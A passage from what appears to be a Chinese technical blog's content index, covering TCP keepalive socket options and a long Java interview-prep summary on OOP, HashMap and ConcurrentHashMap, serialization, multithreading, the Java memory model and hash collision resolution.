长连接和短连接的生命周期</h3><p>短连接在建立连接后，完成一次读写就会自动关闭了。</p><p>正常情况下，一条TCP长连接建立后，只要双方不提出关闭请求并且不出现异常情况，这条连接是一直存在的，操作系统不会自动去关闭它，甚至经过物理网络拓扑的改变之后仍然可以使用。所以一条连接保持几天、几个月、几年或者更长时间都有可能，只要不出现异常情况或由用户（应用层）主动关闭。</p><p>在编程中，往往需要建立一条TCP连接，并且长时间处于连接状态。所谓的TCP长连接并没有确切的时间限制，而是说这条连接需要的时间比较长。</p><h3 id="怎样维护长连接或者检查中断"><a class="markdownIt-Anchor" href="#怎样维护长连接或者检查中断"></a> 怎样维护长连接或者检查中断</h3><ul><li><p>在应用层使用heartbeat来主动监测<br />对于实时性要求较高的网络通信程序，往往需要更加及时的获取已经中断的连接，从而进行及时的处理。但如果对方的连接异常中断，往往是不能及时的得到对方连接已经中断的信息，操作系统检测连接是否中断的时间间隔默认是比较长的，即便它能够检测到，但却不符合我们的实时性需求，所以需要我们进行手工去不断探测。</p></li><li><p>改变socket的keepalive选项，以使socket检查连接是否中断的时间间隔更小，以满足我们的及时性需求。有关的几个选项使用和解析如下：</p><ol><li><p>我们在检测对端以一种非优雅的方式断开连接的时候，可以设置SO_KEEPALIVE属性使得我们在2小时以后发现对方的TCP连接是否依然存在。用法如下:</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">keepAlive &#x3D; 1；</span><br><span class="line">setsockopt(listenfd, SOL_SOCKET, SO_KEEPALIVE, (void*)&amp;keepAlive, sizeof(keepAlive));</span><br></pre></td></tr></table></figure></li><li><p>如果我们不想使用这么长的等待时间，可以修改内核关于网络方面的配置参数，也可设置SOCKET的TCP层（SOL_TCP）选项TCP_KEEPIDLE、TCP_KEEPINTVL和TCP_KEEPCNT。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">TCP_KEEPIDLE：开始首次KeepAlive探测前的TCP空闭时间</span><br><span class="line">TCP_KEEPINTVL：两次KeepAlive探测间的时间间隔</span><br><span class="line">TCP_KEEPCNT：断开前的KeepAlive探测次数</span><br></pre></td></tr></table></figure><p>如果心搏函数要维护客户端的存活，即服务器必须每隔一段时间必须向客户段发送一定的数据，那么使用SO_KEEPALIVE是有很大的不足的。因为SO_KEEPALIVE选项指&quot;此套接口的任一方向都没有数据交换&quot;。在Linux2.6系列上，上面话的理解是只要打开SO_KEEPALIVE选项的套接口端检测到数据发送或者数据接受就认为是数据交换。因此在这种情况下使用 SO_KEEPALIVE选项。</p><p>检测对方是否非正常连接是完全没有作用的，在每隔一段时间发包的情况， keep-alive的包是不可能被发送的。上层程序在非正常断开的情况下是可以正常发送包到缓冲区的。非正常端开的情况是指服务器没有收到&quot;FIN&quot; 或者 &quot;RST&quot;包。</p></li></ol></li></ul>]]></content>
      
      
      <categories>
          
          <category> 基础知识总结 </category>
          
          <category> 计算机网络 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java总结</title>
      <link href="/java-summary/"/>
      <url>/java-summary/</url>
      
        <content type="html"><![CDATA[<h2 id="java的四个特性抽象-封装-继承-多态对多态的理解多态的实现方式"><a class="markdownIt-Anchor" href="#java的四个特性抽象-封装-继承-多态对多态的理解多态的实现方式"></a> Java的四个特性（抽象、封装、继承、多态），对多态的理解（多态的实现方式）</h2><ul><li><p>抽象：抽象是将一类对象的共同特征总结出来构造类的过程。包括数据抽象和行为抽象两个方面。抽象只关注对象有哪些属性和行为，并不关注这些行为的细节是什么。</p></li><li><p>继承：继承是从已有类得到继承信息创建新类的过程。提供继承信息的类被称为父类（超类、基类）；得到继承信息的类被称为子类（派生类），继承让变化中的软件系统有了一定的延续性，同时继承也是封装程序中可变因素的重要手段。</p></li><li><p>封装：通常认为封装是将数据与操作数据的方法绑定起来，对数据的访问只能通过已定义的接口。面向对象的本质就是将现实世界描绘成一系列完全自治、封闭的对象。我们在类中编写的方法是对实现细节的一种封装；我们编写的一个类就是对数据和数据操作的封装。封装就是隐藏一切可隐藏的东西，只向外提供简单的编程接口。</p></li><li><p>多态</p><ul><li>方法重载（overload）实现的是编译时的多态性（也成为前向绑定）</li><li>方法重写（overwrite）实现的是运行时的多态性（也成为后向绑定）</li><li>多态的实现方式：方法重写，子类继承父类并重写父类中已有的或抽象的方法；对象构造，用父类型引用子类型对象，这样同样的引用调用同样的方法就会根据子类对象的不同而表现出不同的行为</li><li>举例：有两种客户：订购客户和卖方客户，两个客户都可以登录系统，他们有相同的方法login，但登录之后他们会进入不同的页面，也就是在登录后有不同的操作行为。两种客户都继承父类的Login方法，但对于不同的对象，拥有不同的操作。</li></ul></li></ul><h2 id="面向对象和面向过程的区别"><a class="markdownIt-Anchor" href="#面向对象和面向过程的区别"></a> 面向对象和面向过程的区别？</h2><ul><li><p>面向过程就像是一个细心的管家，事无具细的都要考虑到。而面向对象就像是一个家用电器，你只需要知道他的功能，不需要知道他的工作原理</p></li><li><p>面向过程是一种以时间为中心的编程思想，就是分析出解决问题所需的步骤，然后用函数把这些步骤实现，并按顺序调用。面向对象是以“对象”为中心的编程思想</p></li><li><p>举例：汽车发送、汽车到站</p><ul><li>对于面向过程来说，这是两个事件，面向过程编程我们关心的是事件，而不是汽车本身。针对上述过程，形成两个函数，依次调用</li><li>对于面向对象来说，我们关心的是汽车这类对象，两个事件只是这类对象所具有的行为。而且对于这两个行为没有顺序要求</li></ul></li></ul><h2 id="重载与重写"><a class="markdownIt-Anchor" href="#重载与重写"></a> 重载与重写</h2><ul><li><p>重载：重载发生在同一个类中，同名的方法如果有不同的参数列表（参数类型、参数个数或者两者都不同）则视为重载</p></li><li><p>重写：重写发生在子类与父类之间，重写要求子类重写方法与父类被重写方法具有相同的返回参数，比父类方法更好访问，不能比父类被重写方法声明更多的异常（里氏代换原则），根据不同的子类对象确定调用哪个对象</p></li></ul><h2 id="面向对象开发的六个基本准则单一职责-开放封闭-里氏替换-依赖倒置-合成聚合复用-接口隔离迪米特法则"><a class="markdownIt-Anchor" href="#面向对象开发的六个基本准则单一职责-开放封闭-里氏替换-依赖倒置-合成聚合复用-接口隔离迪米特法则"></a> 面向对象开发的六个基本准则（单一职责、开放封闭、里氏替换、依赖倒置、合成聚合复用、接口隔离），迪米特法则</h2><ul><li><p>单一职责：一个类只能它该做的事情（高内聚），在面向对象中，如果只让一个类完成它该做的事，而不涉及与它无关的领域就是践行了高内聚的原则，这个类就是单一职责</p></li><li><p>开放封闭：软件实体应当对扩展开放，对修改关闭。要做到开闭有两点：抽象是关键，一个系统如果没有抽象类或者接口系统就没有扩展点；封装可变性，将系统中可变因素封装在一个继承结构中，如果多个可变因素混杂在一起，系统将复杂而混乱</p></li><li><p>里氏替换：任何时候都可以用子类替换父类，子类一定是增加了父类的能力而不是减少，因为子类比父类的能力更多，把能力多的对象当成能力少的对象来用没有问题</p></li><li><p>依赖倒置：面向接口编程（声明方法的参数类型、方法返回类型，变量的引用类型要尽量使用抽象类型而不是具体类型，因为抽象类型可以被其子类型所替代）</p></li><li><p>合成聚合复用：优先使用聚合或合成关系复用代码</p></li><li><p>接口隔离：接口不要大而全，要小而专，一个接口只应该描述一种能力，接口也应该是高内聚的</p></li></ul><p>迪米特法则：又称为最少知识原则，一个对象应当对其他对象有尽可能少的了解</p><h2 id="static与final的区别"><a class="markdownIt-Anchor" href="#static与final的区别"></a> static与final的区别</h2><p>static：</p><ul><li>修饰变量：静态变量随着类加载时完成初始化，内存中只有一个，且JVM只会为它分配一次内存，所有类共享静态变量</li><li>修饰方法：在类加载的时候就存在，不依赖任何实例；static方法必须实现，不能用abstract修饰</li><li>修饰代码块：在类加载完成后就会执行代码块中的内容</li><li>父类静态代码块-&gt;子类静态代码块-&gt;父类非静态代码块-&gt;父类构造方法-&gt;子类非静态代码块-&gt;子类构造方法</li></ul><p>final：</p><ul><li>修饰变量<ul><li>编译期常量：类加载的过程完成初始化，编译后带入到任何计算式中，只能是基本类型</li><li>运行时常量：基本数据类型或引用数据类型，引用不可变，但引用的对象内容可变</li></ul></li><li>修饰方法：不能被继承，不能被子类修改</li><li>修饰类：不能被继承</li><li>修饰新参：final形参不可变</li></ul><h2 id="hashmap和hashtable的区别hashmap中的key可以是任何对象或数据类型吗"><a class="markdownIt-Anchor" href="#hashmap和hashtable的区别hashmap中的key可以是任何对象或数据类型吗"></a> HashMap和Hashtable的区别，HashMap中的key可以是任何对象或数据类型吗？</h2><p>区别：</p><ul><li>Hashtable的方法是同步的，HashMap未经同步，所以在多线程环境下要手动同步HashMap，这个区别就相当于Vector和ArrayList</li><li>Hashtable不允许使用null（key和value都不可以），HashMap允许null值（key只能有一个null值，value没有限制）</li><li>两者的遍历方式大同小异，Hashtable仅仅比HashMap多一个elements方法<br />Hashtable和HashMap都能通过values()方法返回一个Collection，然后遍历<br />两者也都可以通过entrySet()返回一个Set，然后遍历</li><li>Hashtable使用Enumeration，HashMap使用Iterator</li><li>哈希值计算方法不同，hashtable直接使用对象的hashCode，hashMap重新计算hash值，而且用于代替求模</li><li>Hashtable的hash数组大小是11，增加方式是old*2+1，hashMap的默认大小是16，而且一定是2的指数</li><li>hashtable是基于Dictionary，hashMap是基于AbstractMap类</li></ul><p>HashMap的key可以为null，但不可以为可变对象。如果是可变对象时，对象的属性改变，则对象的hashCode也进行了相应的改变，导致下次无法查找到已存在Map的数据。</p><p>如果可变对象被用作HashMap的键时，在改变对象的状态时，不要再改变其哈希值，我们只需要保证成员变量的改变能保证该对象的哈希值不变即可。</p><p>hashtable是线程安全的，其实是在对应的方法添加了synchronized关键字进行修饰，由于在执行此方法的时候需要获得对象锁，则执行起来比较慢。所以可以使用concurrentHashMap</p><h2 id="hashmap与concurrenthashmap"><a class="markdownIt-Anchor" href="#hashmap与concurrenthashmap"></a> HashMap与concurrentHashMap</h2><ol><li><p>区别<br /><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/HashMap%E4%B8%8EconcurrentHashMap%E7%9A%84%E5%8C%BA%E5%88%AB.png" alt="HashMap与concurrentHashMap的区别" /></p></li><li><p>concurrentHashMap线程安全吗，如何保证线程安全？</p><ul><li><p>hashtable容器在竞争激烈的并发环境下表现出效率低下的原因是所有访问hashtable的线程都必须竞争同一把锁，当容器中有多把锁时，每一把锁用于锁住容器中的一部分数据，那么当多线程访问容器内不同数据段的数据时，线程间不会存在锁竞争，从而提高了并发访问的效率，这也是concurrentHashMap采用的锁分段技术，当一个线程访问其中一个段的数据时，其他段的数据也能被其他线程所访问</p></li><li><p>get的高效之处：get过程不需要加锁，除非读到的值是空的才需要加锁重读<br /><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/concurrentHashMap%E7%9A%84get%E6%96%B9%E6%B3%95%E9%AB%98%E6%95%88%E4%B9%8B%E5%A4%84.png" alt="concurrentHashMap的get方法高效之处" /></p></li><li><p>put方法首先定位到segment，然后在segment里进行插入操作<br /><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/concurrentHashMap%E7%9A%84put%E6%93%8D%E4%BD%9C%E6%AD%A5%E9%AA%A4.png" alt="concurrentHashMap的put操作步骤" /></p></li></ul></li></ol><h2 id="string-stringbuffer-stringbuilder"><a class="markdownIt-Anchor" href="#string-stringbuffer-stringbuilder"></a> String、StringBuffer、StringBuilder</h2><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/String%E3%80%81StringBuffer%E3%80%81StringBuilder.png" alt="String、StringBuffer、StringBuilder" /></p><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/String%E7%9A%84%E4%B8%8D%E5%8F%98%E6%80%A7.png" alt="String的不变性" /></p><h2 id="string重写了object的hashcode和tostring重写equals不重写hashcode有什么问题"><a class="markdownIt-Anchor" href="#string重写了object的hashcode和tostring重写equals不重写hashcode有什么问题"></a> String重写了Object的hashCode和toString，重写equals()不重写hashCode()有什么问题？</h2><ul><li><p>当equals方法被重写，通常需要重写hashCode方法，以保证两个相等的对象必须有相同的hashCode</p><ul><li>object1.equals(object2)时为true，则object1.hashCode()==object2.hashCode()也为true</li><li>object1.hashCode()==object2.hashCode()为false，则 object1.equals(object2)一定为false</li><li>object1.hashCode()==object2.hashCode()为true，则object1.equals(object2)状态不确定</li></ul></li><li><p>在存储散列集合(如Set)时，如果原对象.equals(新对象)，但如果没有对hashCode重写，即两个对象拥有不同的hashCode，则在集合中会存储两个值相同的对象，从而导致混淆。<strong>因此，重写equals方法时，必须重写hashCode方法</strong></p></li></ul><h2 id="java序列化"><a class="markdownIt-Anchor" href="#java序列化"></a> Java序列化</h2><ol><li><p>定义：将那些实现了Serializable接口的对象转换成一个字节序列，并能够在以后将这个字节序列完全恢复到原来的对象，序列化可以弥补不同操作系统之间的差异</p></li><li><p>作用</p><ul><li>Java远程方法调用</li><li>对JavaBeans进行序列化</li></ul></li><li><p>序列化与反序列化<br /><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.png" alt="序列化与反序列化" /></p></li></ol><p><em>注意事项：</em></p><ul><li>被static修饰的属性不会被序列化</li><li>对象的类名、属性都会被序列化，但是方法不会被序列化</li><li>要保证对象所在的类的属性可以被序列化</li><li>当通过网络、文件进行序列化时，必须按照写入的顺序读取对象</li><li>反序列化时必须有序列化对象时的class文件</li><li>最好显示的声明serializableID，因为在不同的JVM时，默认生成的serializableID不同，可能导致反序列化失败</li></ul><h2 id="多线程"><a class="markdownIt-Anchor" href="#多线程"></a> 多线程</h2><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/%E5%A4%9A%E7%BA%BF%E7%A8%8B.png" alt="多线程" /></p><p><em>线程安全</em></p><ul><li>定义：某个类的行为与其规范一致；不管多个线程是怎样的执行顺序和优先级，或是wait、sleep、join等，如果一个类在多线程访问下都正常，并且不需要额外的同步处理和协调，那么这就是线程安全。</li><li>如何保证线程安全：对变量使用volitate；对程序段进行加锁（synchronized、lock）</li><li>注意：非线程安全的集合可以在多线程中使用，但是不能用作多个线程共享的属性，只能作为某个线程独享的属性</li></ul><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/%E5%A4%9A%E7%BA%BF%E7%A8%8B%E5%85%B1%E7%94%A8%E4%B8%80%E4%B8%AA%E5%8F%98%E9%87%8F.png" alt="多线程共用一个变量" /></p><h2 id="线程池"><a class="markdownIt-Anchor" href="#线程池"></a> 线程池</h2><p>定义：实现先创建若干个可执行的线程放入一个容器（池）中，当需要的时候，不用自行创建只需要从容器中获取，使用完毕后不需要销毁而是放入到容器中，从而减少创建和销毁线程对象的开销。</p><p><strong>设计线程池</strong><br /><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/%E5%88%9B%E5%BB%BA%E7%BA%BF%E7%A8%8B%E6%B1%A0.png" alt="创建线程池" /></p><h2 id="volatile关键字与synchronized的区别"><a class="markdownIt-Anchor" href="#volatile关键字与synchronized的区别"></a> volatile关键字与synchronized的区别</h2><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/%E5%8C%BA%E5%88%AB.png" alt="区别" /></p><h2 id="sleep与wait"><a class="markdownIt-Anchor" href="#sleep与wait"></a> sleep()与wait()</h2><ul><li>sleep是Thread类的方法</li><li>wait是Object类的方法</li><li>区别：<ul><li>sleep()方法（休眠）是线程类（Thread）的静态方法，调用此方法会让当前线程暂停执行指定的时间，将执行机会（CPU）让给其他线程，但是对象的锁依然保持，因此休眠时间结束后会自动恢复（线程回到就绪状态）</li><li>wait()是object类的方法，调用对象的wait()方法导致当前线程放弃对象的锁（线程暂停执行），进入对象的等待池（wait pool），只有调用对象的notify()方法（或notifyAll()方法）时才能唤醒等待池中的线程进入等锁池（lock pool），如果线程重新获得对象的锁就可以进入就绪状态</li></ul></li></ul><h2 id="synchronized与lock"><a class="markdownIt-Anchor" href="#synchronized与lock"></a> synchronized与lock</h2><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/synchronized%E4%B8%8Elock%E7%9A%84%E5%8C%BA%E5%88%AB.png" alt="synchronized与lock的区别" /></p><p>synchronized与static synchronized的区别：</p><ul><li>synchronized是对类的当前实例进行加锁，防止其他线程同时访问该类的该实例的所有synchronized锁，同一个类的不同实例之间没有这种约束</li><li>static synchronized是控制类的所有实例的访问，限制线程同时访问JVM中该类的所有实例同时访问对应的代码块</li></ul><h2 id="异常"><a class="markdownIt-Anchor" href="#异常"></a> 异常</h2><ul><li>Throwable是Java语言中所有错误和异常的超类，它有两个子类：<code>Error</code>和<code>Exception</code></li><li>异常种类<ul><li>Error：错误，是程序无法处理的，如OutOfMemeryError、ThreadDeath等，这种情况下交由JVM处理，一般会选择终止线程</li><li>Exception：程序可以处理的异常，它又分为<code>CheckedException</code>（受检异常）和<code>UnCheckedException</code>（不受检异常）<ul><li><code>CheckedException</code>：发生在编译阶段，必须使用<code>try...catch...</code>或者<code>throws</code>，否则编译不通过。</li><li><code>UnCheckedException</code>：发生在运行期，一般由程序的逻辑问题引起。</li></ul></li></ul></li></ul><h2 id="java中的nio-bio-aio分别是什么"><a class="markdownIt-Anchor" href="#java中的nio-bio-aio分别是什么"></a> Java中的NIO、BIO、AIO分别是什么？</h2><ol><li><p>BIO</p><ul><li>同步并阻塞，服务器实现模式为<code>一个连接一个线程</code>，即客户端有请求时服务器端就需要启动一个线程进行处理，如果这个连接不做任何事情就会造成不必要的线程开销，可以通过线程池机制来改善</li><li>BIO方式适用于<code>连接数目比较小且固定的架构</code>，这种方式对服务器资源要求比较高，并发局限于应用中</li></ul></li><li><p>NIO</p><ul><li>同步非阻塞，服务器实现模式为<code>一个请求一个线程</code>，即客户端发送的连接请求都会注册到多路复用器上，多路复用器轮询到连接有I/O请求时，才启动一个线程进行处理</li><li>NIO方式适用于<code>连接数多且连接比较短的架构</code>，比如聊天服务器，并发局限于应用中</li></ul></li><li><p>AIO</p><ul><li>异步非阻塞，服务器实现模式为<code>一个有效请求一个线程</code>，客户端的I/O请求都是由OS先完成了再通知服务器应用去启动线程进行处理</li><li>AIO方式适用于<code>连接数目多且连接比较长的架构</code>，比如相册服务器，充分调用OS参与并发操作</li></ul></li></ol><h2 id="java内存模型java-memory-modeljmm"><a class="markdownIt-Anchor" href="#java内存模型java-memory-modeljmm"></a> Java内存模型（Java Memory model，JMM）</h2><p>对于并发编程，有两个关键问题：线程之间的<strong>通信和同步</strong></p><h3 id="线程之间的通信"><a class="markdownIt-Anchor" href="#线程之间的通信"></a> 线程之间的通信</h3><p>线程的通信是指线程之间以何种机制来交换信息。在命令式编程中，线程之间的通信机制有两种<strong>共享内存和消息传递。</strong><br />典型的共享内存通信方式就是通过<strong>共享对象</strong>来进行通信。典型的消息传递方式就是<strong>wait()和notify()。</strong></p><h3 id="线程之间的同步"><a class="markdownIt-Anchor" href="#线程之间的同步"></a> 线程之间的同步</h3><p>同步是指程序用于控制不同线程之间操作发生相对顺序的机制。<br />在共享内存并发模型里，同步是显式进行的。程序必须显式指定某个方法或某段代码需要在线程之间互斥执行。<br />在消息传递的并发模型里，由于消息的发送必须在消息的接收之前，因此同步是隐式进行的。</p><h3 id="java的并发采用的是共享内存模型"><a class="markdownIt-Anchor" href="#java的并发采用的是共享内存模型"></a> Java的并发采用的是共享内存模型</h3><p>JMM决定一个线程对共享变量的写入何时对另一个线程可见。从抽象的角度来讲，JMM定义了线程和主内存之间的抽象关系：**线程之间的共享变量存储在主内存中，每个线程都有一个私有的本地内存，本地内存中存储了该线程以读/写共享变量的副本。**本地内存是JMM的一个抽象概念，并不真实存在。</p><p><em>线程之间的通信方式：首先，线程A把本地内存A中更新过的共享变量刷新到主内存中。然后，线程B到主内存中去读取线程A之前已更新过的共享变量。</em></p><p>从整体来看，这两个步骤实质上是线程A在向线程B发送消息，而且这个通信过程必须要经过主内存。JMM通过控制主内存与每个线程的本地内存之间的交互，来为Java程序员提供<strong>内存可见性保证</strong>。</p><h3 id="jvm对java内存模型的实现"><a class="markdownIt-Anchor" href="#jvm对java内存模型的实现"></a> JVM对Java内存模型的实现</h3><p>在JVM内部，Java内存模型把内存分成了两个部分：线程栈区和堆区。下图展示了Java内存模型在JVM中的逻辑视图：<br /><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/20160921182837697.jpg" alt="" /></p><p>JVM中运行的每个线程都拥有自己的线程栈，线程栈包括了当前线程执行的方法调用相关信息，我们也把它称作调用栈。随着代码的执行，调用栈会不断的变化。</p><p><strong>线程栈</strong>还包含了当前方法的所有本地变量信息。一个线程只能读取自己的线程栈，也就是说，**线程中的本地变量对其他线程是不可见的。**即使两个线程执行的是同一段代码，它们也会各自在自己的线程栈创建本地变量，因此，<strong>每个线程中的本地变量都有自己的版本。</strong><br />所有原始类型（boolean、byte、short、int、long、char、float、double）的本地变量都直接保存在线程栈中，对于它们的值各个线程都相互独立。对于原始类型的本地变量，一个线程可以传递一个副本给另一个线程，当它们之间是无法共享的。</p><p><strong>堆区</strong>包含了Java应用创建的所有对象信息，不管对象是哪个线程创建的，其中的对象包括原始类型的封装类（如Byte、Integer、Long等）。不管对象是属于一个成员变量还是方法中的本地变量，它都会被存储在堆区。</p><ul><li>一个本地变量如果是原始类型，那么它会被完全存储到栈区。</li><li>一个本地变量也有可能是一个对象的引用，这种情况下，这个本地引用会被存储到栈中，但是对象本身仍然存储在堆区。</li><li>对于一个对象的成员方法，这些方法中包含本地变量，仍需要存储在栈区，即使它们所属的对象在堆区。</li><li>对于一个对象的成员变量，不管它是原始类型还是包装类型，都会被存储到堆区。</li><li>Static类型的变量以及类本身相关信息都会随着类本身存储在堆区。</li></ul><p>堆中的对象可以被多线程共享。如果一个线程获得一个对象的应用，它便可访问这个对象的成员变量。如果两个线程同时调用了同一个对象的同一个方法，那么这两个线程便可同时访问这个对象的成员变量，但是对于本地变量，每个线程都会拷贝一份到自己的线程栈中。</p><p>下图是上面的全部过程：<br /><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/20160921182948601.jpg" alt="" /></p><h3 id="共享对象的可见性与竞争现象"><a class="markdownIt-Anchor" href="#共享对象的可见性与竞争现象"></a> 共享对象的可见性与竞争现象</h3><p>volatile关键字可以保证变量会直接从主存读取，而对变量的更新也会直接写到主存。volatile原理是基于CPU内存屏障指令实现的。<br />synchronized代码块可以保证同一个时刻只能有一个线程进入代码竞争区，synchronized代码块也能保证代码块中所有变量都将会从主存中读，当线程退出代码块时，对所有变量的更新将会flush到主存，不管这些变量是不是volatile类型的。</p><h3 id="volatile和synchronized的区别"><a class="markdownIt-Anchor" href="#volatile和synchronized的区别"></a> volatile和synchronized的区别</h3><p>首先理解线程安全的两个方面：<strong>执行控制和内存可见</strong>。<br />执行控制的目的是控制代码执行顺序及是否可以并发执行。<br />内存可见指的是线程执行结果在内存中对其他线程的可见性。根据Java内存模型的实现，线程在具体执行时，会先拷贝主存数据到线程本地（CPU缓存），操作完成后再把结果从线程本地刷到主存。</p><p><strong>synchronized关键字解决的是执行控制的问题</strong>，它会阻止其他线程获得当前对象的监控锁，这样使得当前被synchronized修饰的代码块无法被其他线程访问，也就无法并发执行。更为重要的是，synchronized还会创建<strong>内存屏障</strong>，内存屏障指令保证了所有CPU操作结果都会刷新到主存中，从而保证了内存可见性，<strong>同时也使得先获得这个锁的线程都happens-before与随后获得这个锁的线程。</strong></p><p>volatile关键字解决的是内存可见的问题，该关键字会使得被修饰的变量读写都会直接刷新到主存中，这样就保证了内存可见。<strong>该种方式可以保证内存可见性但是对读取没有要求的需求中。</strong></p><blockquote><p>使用volatile仅能实现对原始变量（如short、boolean、int等）操作的原子性，但是不能保证复合操作的原子性。例如，对于i++，实际上是由多个原子操作组成，如果使用多个线程去操作i++，则只能保证他们所操作的变量i在同一块内存区域，但是存在写入脏数据的情况。</p></blockquote><p><strong>使用volatile关键字要满足以下条件：</strong></p><ul><li>对变量的写入操作不依赖与变量的当前值，或者可以确保只有单个线程在操作变量</li><li>该变量没有包含在具有其他变量的不变式中</li></ul><p><strong>总结如下：</strong><br /><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/volatile%E4%B8%8Esynchronized%E7%9A%84%E5%8C%BA%E5%88%AB.png" alt="volatile与synchronized的区别" /></p><h3 id="java内存模型的基础原理"><a class="markdownIt-Anchor" href="#java内存模型的基础原理"></a> Java内存模型的基础原理</h3><ul><li>指令重排序：<br />为了提高程序的执行性能，编译器和处理器都会对指令进行重排序，但是JMM确保在不同的编译器和处理器平台下，通过插入指定类型的内存屏障来禁止编译器重排序和处理器重排序，为上层提供一致的内存可见性保证。</li></ul><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/%E6%8C%87%E4%BB%A4%E5%BA%8F%E5%88%97%E7%9A%84%E9%87%8D%E6%8E%92%E5%BA%8F.png" alt="指令序列的重排序" /></p><ul><li>数据依赖性：<br />如果两个操作在访问同一个变量，且这两个操作有一个是写操作，此时两个操作之间存在数据依赖性。</li></ul><p>编译器重排序和处理器重排序不会改变数据依赖性关系的两个操作之间的执行顺序，即不会重排序。</p><p><strong>注意：</strong><br />这里所说的数据依赖性仅针对单个处理器中执行的指令序列和单个线程中执行的操作，不同处理器和线程间之间的数据依赖性不被编译器和处理器所考虑。</p><ul><li>as-if-serial*<br />不过怎么重排序，单线程下的执行结果不能改变，编译器、runtime（运行时）和处理器都必须遵守as-if-serial语义</li></ul><h3 id="内存屏障memory-barrier"><a class="markdownIt-Anchor" href="#内存屏障memory-barrier"></a> 内存屏障（Memory Barrier）</h3><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/%E5%86%85%E5%AD%98%E5%B1%8F%E9%9A%9C.png" alt="内存屏障" /></p><p><em>volatile内存语义的实现：</em><br /><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/volatile%E5%86%85%E5%AD%98%E8%AF%AD%E4%B9%89%E7%9A%84%E5%AE%9E%E7%8E%B0.png" alt="volatile内存语义的实现" /></p><p>对于volatile关键字，JMM采用保守策略</p><h3 id="happens-before策略"><a class="markdownIt-Anchor" href="#happens-before策略"></a> happens-before策略</h3><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/happens-before%E8%A7%84%E5%88%99.png" alt="happens-before规则" /></p><p><strong>注意：</strong><br />两个操作之间具有happens-before关系，并不意味前一个操作必须要在后一个操作之前执行！仅仅要求前一个操作的执行结果，对于后一个操作是可见的，且前一个操作按顺序排在后一个操作之前。</p><h2 id="解决hash冲突的几种方法"><a class="markdownIt-Anchor" href="#解决hash冲突的几种方法"></a> 解决hash冲突的几种方法</h2><h3 id="开放地址法"><a class="markdownIt-Anchor" href="#开放地址法"></a> 开放地址法</h3><ol><li><p>线性探测法：ThreadLocalMap<br />插入元素时，如果发生冲突，算法会简单的<strong>从该槽位置向后循环遍历hash表，直到找到表中的下一个空槽，并将该元素放入该槽中（会导致相同hash值的元素挨在一起和其他hash值对应的槽被占用）。</strong> 查找元素时，首先散列值所指向的槽，如果没有找到匹配，则继续从该槽遍历hash表，直到：（1）找到相应的元素；（2）找到一个空槽，指示查找的元素不存在，（所以不能随便删除元素）；（3）整个hash表遍历完毕（指示该元素不存在并且hash表是满的）<br />用线性探测法处理冲突，思路清晰，算法简单，但存在下列缺点：<br />① 处理溢出需另编程序。一般可另外设立一个溢出表，专门用来存放上述哈希表中放不下的记录。此溢出表最简单的结构是顺序表，查找方法可用顺序查找。<br />② 按上述算法建立起来的哈希表，删除工作非常困难。如果将此元素删除，查找的时会发现空槽，则会认为要找的元素不存在。只能标上已被删除的标记，否则，将会影响以后的查找。<br />③ 线性探测法很容易产生堆聚现象。所谓堆聚现象，就是存入哈希表的记录在表中连成一片。按照线性探测法处理冲突，如果生成哈希地址的连续序列愈长 ( 即不同关键字值的哈希地址相邻在一起愈长 ) ，则当新的记录加入该表时，与这个序列发生冲突的可能性愈大。因此，哈希地址的较长连续序列比较短连续序列生长得快，这就意味着，一旦出现堆聚 ( 伴随着冲突 ) ，就将引起进一步的堆聚。</p></li><li><p>线程补偿探测法<br />线性补偿探测法的基本思想是：将线性探测的步长从 1 改为 Q ，即将上述算法中的<br />hash ＝ (hash ＋ 1) % m 改为：hash ＝ (hash ＋ Q) % m = hash % m + Q % m，**而且要求 Q 与 m 是互质的，**以便能探测到哈希表中的所有单元。</p></li><li><p>伪随机探测<br />随机探测的基本思想是：将线性探测的步长从常数改为随机数，即令： hash ＝ (hash ＋ RN) % m ，其中 RN 是一个随机数。在实际程序中应预先用随机数发生器产生一个随机序列，将此序列作为依次探测的步长。这样就能使不同的关键字具有不同的探测次序，从而可以避 免或减少堆聚。基于与线性探测法相同的理由，在线性补偿探测法和随机探测法中，删除一个记录后也要打上删除标记。</p></li></ol><h3 id="拉链法"><a class="markdownIt-Anchor" href="#拉链法"></a> 拉链法</h3><p>HashMap<br />拉链法的优点<br />与开放定址法相比，拉链法有如下几个优点：<br />①拉链法处理冲突简单，且无堆积现象，即非同义词决不会发生冲突，因此平均查找长度较短；<br />②由于拉链法中各链表上的结点空间是动态申请的，故它更适合于造表前无法确定表长的情况；<br 